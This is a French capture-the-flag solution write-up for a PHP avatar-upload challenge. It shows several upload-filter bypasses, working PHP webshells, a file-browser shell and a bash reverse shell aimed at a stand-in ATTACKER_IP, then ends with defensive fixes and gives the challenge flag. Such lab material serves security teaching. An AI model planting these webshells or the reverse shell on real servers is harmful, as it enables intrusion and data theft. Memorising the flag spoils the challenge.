# 🎯 Solution du Challenge Upload

## 📖 Table des matières
1. [Reconnaissance](#reconnaissance)
2. [Analyse de la vulnérabilité](#analyse)
3. [Exploitation](#exploitation)
4. [Récupération du flag](#flag)
5. [Webshells avancés](#webshells)

---

## 🔍 Reconnaissance

### Étape 1 : Explorer l'application

1. **Page d'accueil** (`index.php`)
   - Forum simple avec catégories
   - Lien vers "Mon Profil"

2. **Page profil** (`profile.php`)
   - Formulaire d'upload d'avatar
   - Indice : "Formats acceptés : JPG, JPEG, PNG, GIF"
   - **Objectif** : Lire `/flag.txt`

### Étape 2 : Tester l'upload

Upload d'une vraie image :
```bash
# Créer une image test
convert -size 100x100 xc:white test.jpg

# Upload via le formulaire
# ✅ Succès : fichier uploadé dans /uploads/test.jpg
```

### Étape 3 : Identifier la faille

Test d'un fichier PHP :
```bash
echo '<?php phpinfo(); ?>' > test.php
# Upload
# ❌ Erreur : "Format de fichier non autorisé"
```

**Constat** : Validation basée uniquement sur l'extension !

---

## 🔬 Analyse de la vulnérabilité

### Code vulnérable (profile.php)

```php
$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
$fileExtension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));

if (!in_array($fileExtension, $allowedExtensions)) {
    $message = "Format non autorisé";
} else {
    move_uploaded_file($fileTmpName, $uploadDir . $fileName);
}
```

### Points faibles

1. ❌ **Validation extension seulement**
   - `pathinfo()` prend la dernière extension
   - Pas de vérification MIME
   - Pas d'analyse du contenu

2. ❌ **Nom de fichier préservé**
   - `$fileName = basename($file['name'])`
   - Pas de renommage
   - Permet double extension

3. ❌ **Exécution PHP autorisée**
   - `.htaccess` permissif dans `/uploads/`
   - PHP exécuté côté serveur

---

## 💣 Exploitation

### Méthode 1 : Double extension (Recommandé)

#### Principe
`pathinfo('shell.php.jpg', PATHINFO_EXTENSION)` retourne `'jpg'` ✅

Mais Apache peut exécuter `shell.php.jpg` comme PHP selon la config !

#### Exploitation

1. **Créer le webshell**
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php.jpg
```

2. **Upload via le formulaire**
   - Renommer `shell.php.jpg` en `.jpg` temporairement si le navigateur filtre
   - Upload réussi ✅

3. **Accéder au webshell**
```
http://localhost:PORT/uploads/shell.php.jpg?cmd=ls
```

4. **Lire le flag**
```
http://localhost:PORT/uploads/shell.php.jpg?cmd=cat%20/flag.txt
```

**Flag** : `CTF{Upl04d_PHP_Sh3ll_M4st3r_2024}` 🎉

---

### Méthode 2 : Extension alternative (.phtml)

#### Principe
`.phtml` est souvent exécuté comme PHP mais oublié dans les blacklists.

#### Exploitation

1. **Créer le webshell**
```bash
echo '<?php passthru($_GET["c"]); ?>' > avatar.phtml
```

2. **Modifier le formulaire HTML**
```html
<!-- Dans le navigateur (DevTools) -->
<input type="file" accept="image/*,.phtml">
```

3. **Upload du fichier .phtml**

4. **Exécution**
```
http://localhost:PORT/uploads/avatar.phtml?c=cat%20/flag.txt
```

---

### Méthode 3 : Polyglot GIF

#### Principe
Créer un fichier qui est à la fois :
- Une image GIF valide (passe certains checks)
- Un script PHP exécutable

#### Exploitation

1. **Créer le polyglot**
```bash
# GIF89a = magic bytes GIF
echo 'GIF89a; <?php system($_GET["x"]); ?>' > image.gif
```

2. **Upload** (extension .gif acceptée ✅)

3. **Exécution**
```
http://localhost:PORT/uploads/image.gif?x=cat%20/flag.txt
```

**Note** : Fonctionne car le `.htaccess` permet l'exécution PHP même sur `.gif`

---

### Méthode 4 : Burp Suite / Interception

#### Principe
Intercepter la requête HTTP et modifier le nom de fichier côté serveur.

#### Exploitation

1. **Configurer Burp Suite**
   - Proxy → Intercept → ON
   - Configurer le navigateur pour utiliser le proxy

2. **Upload d'un fichier .jpg**
```
POST /profile.php HTTP/1.1
...
Content-Disposition: form-data; name="avatar"; filename="test.jpg"
Content-Type: image/jpeg

<?php system($_GET["cmd"]); ?>
```

3. **Modifier dans Burp**
```
Content-Disposition: form-data; name="avatar"; filename="shell.php"
```

4. **Forward la requête**

5. **Accès au shell**
```
http://localhost:PORT/uploads/shell.php?cmd=cat%20/flag.txt
```

---

### Méthode 5 : Null byte (si PHP < 5.3)

#### Principe
`shell.php%00.jpg` → PHP traite comme `shell.php`

**Note** : Ne fonctionne plus sur PHP moderne (5.3+), mais utile à connaître.

---

## 🚩 Récupération du flag

Une fois le webshell uploadé, plusieurs commandes possibles :

### Méthode directe
```
?cmd=cat /flag.txt
```

### Méthode avec find
```
?cmd=find / -name flag.txt -exec cat {} \;
```

### Méthode avec grep
```
?cmd=grep -r "CTF{" /
```

### Avec encodage
```
?cmd=cat%20/flag.txt
?cmd=cat+/flag.txt
?cmd=/bin/cat%20/flag.txt
```

---

## 🐚 Webshells avancés

### Shell basique
```php
<?php system($_GET['cmd']); ?>
```

### Shell avec output
```php
<?php 
echo '<pre>';
system($_GET['cmd']);
echo '</pre>';
?>
```

### Shell avec pwd
```php
<?php
echo '<pre>';
echo 'Current directory: ' . getcwd() . "\n\n";
system($_GET['cmd']);
echo '</pre>';
?>
```

### Shell interactif
```php
<?php
if(isset($_GET['cmd'])) {
    echo '<pre>';
    $output = shell_exec($_GET['cmd']);
    echo htmlspecialchars($output);
    echo '</pre>';
}
?>
<form method="GET">
    <input type="text" name="cmd" size="50" placeholder="Enter command...">
    <input type="submit" value="Execute">
</form>
```

### Reverse shell
```php
<?php
// Remplacer ATTACKER_IP et PORT
exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");
?>
```

### File browser
```php
<?php
$dir = isset($_GET['dir']) ? $_GET['dir'] : '.';
echo '<h3>Directory: ' . htmlspecialchars($dir) . '</h3>';
echo '<ul>';
foreach(scandir($dir) as $file) {
    if($file == '.' || $file == '..') continue;
    $path = $dir . '/' . $file;
    if(is_dir($path)) {
        echo '<li>📁 <a href="?dir=' . urlencode($path) . '">' . htmlspecialchars($file) . '</a></li>';
    } else {
        echo '<li>📄 <a href="?read=' . urlencode($path) . '">' . htmlspecialchars($file) . '</a></li>';
    }
}
echo '</ul>';

if(isset($_GET['read'])) {
    echo '<pre>' . htmlspecialchars(file_get_contents($_GET['read'])) . '</pre>';
}
?>
```

---

## 🎓 Leçons apprises

### Erreurs de sécurité identifiées

1. ❌ **Validation insuffisante**
   - Extension seule ne suffit pas
   - Besoin de vérifier le MIME type
   - Analyser le contenu réel

2. ❌ **Exécution PHP dans uploads**
   - Jamais activer PHP dans dossier uploads
   - Utiliser `.htaccess` restrictif

3. ❌ **Nom de fichier préservé**
   - Toujours renommer les uploads
   - Utiliser UUID ou hash

4. ❌ **Stockage dans webroot**
   - Stocker hors de `/var/www/html`
   - Servir via script proxy

### Bonnes pratiques

✅ **Validation multi-couches**
```php
// 1. Extension
$ext = strtolower(pathinfo($fileName, PATHINFO_EXTENSION));
if (!in_array($ext, ['jpg', 'png', 'gif'])) die();

// 2. MIME type
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $tmpName);
if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'])) die();

// 3. Contenu réel
if (!getimagesize($tmpName)) die();

// 4. Renommer
$newName = uniqid() . '.jpg';
move_uploaded_file($tmpName, '/secure/uploads/' . $newName);
```

✅ **Configuration Apache sécurisée**
```apache
<Directory /var/www/html/uploads>
    # Désactiver PHP
    php_flag engine off
    
    # Interdire .htaccess
    AllowOverride None
    
    # Types MIME stricts
    <FilesMatch "\.">
        ForceType application/octet-stream
    </FilesMatch>
</Directory>
```

✅ **Stockage externe**
- AWS S3
- Serveur de fichiers dédié
- CDN

---

## 🔗 Ressources

- [OWASP File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [HackTricks - File Upload](https://book.hacktricks.xyz/pentesting-web/file-upload)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

---

**FLAG FINAL** : `CTF{Upl04d_PHP_Sh3ll_M4st3r_2024}` 🎉
